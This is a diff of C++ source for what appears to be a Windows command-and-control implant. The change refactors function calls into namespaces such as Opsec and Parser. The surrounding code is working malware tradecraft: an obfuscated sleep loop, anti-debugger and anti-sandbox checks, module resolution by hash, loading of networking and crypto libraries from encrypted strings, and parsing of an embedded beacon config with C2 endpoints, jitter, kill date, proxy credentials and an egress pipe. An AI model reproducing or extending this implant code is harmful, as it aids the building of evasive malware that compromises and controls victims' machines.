@@ -14,14 +14,14 @@ namespace Core {
         }
 
         do {
-            SleepObf();
+            Opsec::SleepObf();
 
-            if (!CheckTime()) {
+            if (!Opsec::CheckTime()) {
                 continue;
             }
 
             if (!Ctx->Session.Checkin) {
-                SeCheckEnvironment();
+                Opsec::SeCheckEnvironment();
 
                 if (ntstatus == ERROR_BAD_ENVIRONMENT) {
                     return_defer(ntstatus);
@@ -39,8 +39,7 @@ namespace Core {
             } else {
                 Ctx->Session.Retry = 0;
             }
-        }
-        while (TRUE);
+        } while (TRUE);
 
     defer:
         FreeApi(Ctx);
@@ -54,8 +53,8 @@ namespace Core {
         ULONG Kernel32              = { };
         OSVERSIONINFOW OSVersionW   = { };
 
-        CreateParser(&Parser, Strings, sizeof(Strings));
-        ParserMemcpy(&Parser, &Ctx->Config.Key);
+        Parser::CreateParser(&Parser, Strings, sizeof(Strings));
+        Parser::ParserMemcpy(&Parser, &Ctx->Config.Key);
 
         x_memset(Strings, 0, sizeof(Strings));
 
@@ -101,7 +100,7 @@ namespace Core {
             Kernel32 = (KERNEL7);
         }
 
-        if (!(Ctx->Modules.kernel32 = LdrGetModuleAddress(Kernel32))) {
+        if (!(Ctx->Modules.kernel32 = Memory::LdrGetModuleAddress(Kernel32))) {
             return_defer(ERROR_PROC_NOT_FOUND);
         }
         if(
@@ -114,17 +113,17 @@ namespace Core {
 
 #ifndef DEBUG
         do {
-            SeCheckDebugger();
+            Opsec::SeCheckDebugger();
             if (ntstatus != ERROR_SUCCESS) {
 
-                Timeout(SECONDS(8));
+                Random::Timeout(SECONDS(8));
                 return_defer(ERROR_BAD_ENVIRONMENT);
             }
 
-            SeCheckSandbox();
+            Opsec::SeCheckSandbox();
             if (ntstatus != ERROR_SUCCESS) {
 
-                Timeout(SECONDS(8));
+                Random::Timeout(SECONDS(8));
                 return_defer(ERROR_BAD_ENVIRONMENT);
             }
             break;
@@ -206,10 +205,10 @@ namespace Core {
 
         if ((FPTR(Ctx->win32.LoadLibraryA, Ctx->Modules.kernel32, LOADLIBRARYA))) {
             if (
-                !(Ctx->Modules.crypt32 = Ctx->win32.LoadLibraryA(UnpackString(&Parser, nullptr))) ||
-                !(Ctx->Modules.winhttp = Ctx->win32.LoadLibraryA(UnpackString(&Parser, nullptr))) ||
-                !(Ctx->Modules.advapi  = Ctx->win32.LoadLibraryA(UnpackString(&Parser, nullptr))) ||
-                !(Ctx->Modules.iphl    = Ctx->win32.LoadLibraryA(UnpackString(&Parser, nullptr)))) {
+                !(Ctx->Modules.crypt32 = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
+                !(Ctx->Modules.winhttp = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
+                !(Ctx->Modules.advapi  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr))) ||
+                !(Ctx->Modules.iphl    = Ctx->win32.LoadLibraryA(Parser::UnpackString(&Parser, nullptr)))) {
                 return_defer(ERROR_MOD_NOT_FOUND);
             }
         } else {
@@ -260,50 +259,49 @@ namespace Core {
 
         PARSER Parser = { };
 
-        CreateParser(&Parser, Config, sizeof(Config));
+        Parser::CreateParser(&Parser, Config, sizeof(Config));
         x_memset(Config, 0, sizeof(Config));
 
         //XteaCrypt(B_PTR(Parser.Handle), Parser.Length, Ctx->Config.Key, FALSE);
 
-        ParserStrcpy(&Parser, &Ctx->Config.Hostname);
-        ParserStrcpy(&Parser, &Ctx->Config.Domain);
+        Parser::ParserStrcpy(&Parser, &Ctx->Config.Hostname);
+        Parser::ParserStrcpy(&Parser, &Ctx->Config.Domain);
 
-        Ctx->Session.PeerId = UnpackDword(&Parser);
-        Ctx->Config.Sleeptime = UnpackDword(&Parser);
-        Ctx->Config.Jitter = UnpackDword(&Parser);
-        Ctx->Config.WorkingHours = UnpackDword(&Parser);
-        Ctx->Config.Killdate = UnpackDword64(&Parser);
+        Ctx->Session.PeerId = Parser::UnpackDword(&Parser);
+        Ctx->Config.Sleeptime = Parser::UnpackDword(&Parser);
+        Ctx->Config.Jitter = Parser::UnpackDword(&Parser);
+        Ctx->Config.WorkingHours = Parser::UnpackDword(&Parser);
+        Ctx->Config.Killdate = Parser::UnpackDword64(&Parser);
 
         Ctx->Transport.OutboundQueue = nullptr;
 
 #ifdef TRANSPORT_HTTP
-        ULONG nEndpoints = 0;
         Ctx->Transport.http = (PHTTP_CONTEXT) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(HTTP_CONTEXT));
 
         Ctx->Transport.http->Handle     = nullptr;
         Ctx->Transport.http->Endpoints  = nullptr;
         Ctx->Transport.http->Headers    = nullptr;
 
-        ParserWcscpy(&Parser, &Ctx->Transport.http->Useragent);
-        ParserWcscpy(&Parser, &Ctx->Transport.http->Address  );
+        Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Useragent);
+        Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Address  );
 
-        Ctx->Transport.http->Port = UnpackDword(&Parser);
-        Ctx->Transport.http->nEndpoints = UnpackDword(&Parser);
+        Ctx->Transport.http->Port = Parser::UnpackDword(&Parser);
+        Ctx->Transport.http->nEndpoints = Parser::UnpackDword(&Parser);
         Ctx->Transport.http->Endpoints = (LPWSTR*) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(LPWSTR) * ((Ctx->Transport.http->nEndpoints + 1) * 2));
 
         for (auto i = 0; i < Ctx->Transport.http->nEndpoints; i++) {
-            ParserWcscpy(&Parser, &Ctx->Transport.http->Endpoints[i]);
+            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->Endpoints[i]);
         }
 
         Ctx->Transport.http->Endpoints[Ctx->Transport.http->nEndpoints + 1] = nullptr;
-        Ctx->Transport.bProxy = UnpackBool(&Parser);
+        Ctx->Transport.bProxy = Parser::UnpackBool(&Parser);
 
         if (Ctx->Transport.bProxy) {
             Ctx->Transport.http->Access = INTERNET_OPEN_TYPE_PROXY;
 
-            ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyAddress );
-            ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyUsername );
-            ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyPassword );
+            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyAddress );
+            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyUsername );
+            Parser::ParserWcscpy(&Parser, &Ctx->Transport.http->ProxyPassword );
 
         } else {
             Ctx->Transport.http->ProxyUsername = nullptr;
@@ -311,9 +309,8 @@ namespace Core {
         }
 #endif
 #ifdef TRANSPORT_PIPE
-        ParserWcscpy(&Parser, &Ctx->Config.EgressPipename);
+        Parser::ParserWcscpy(&Parser, &Ctx->Config.EgressPipename);
 #endif
-
-        DestroyParser(&Parser);
+        Parser::DestroyParser(&Parser);
     }
 }
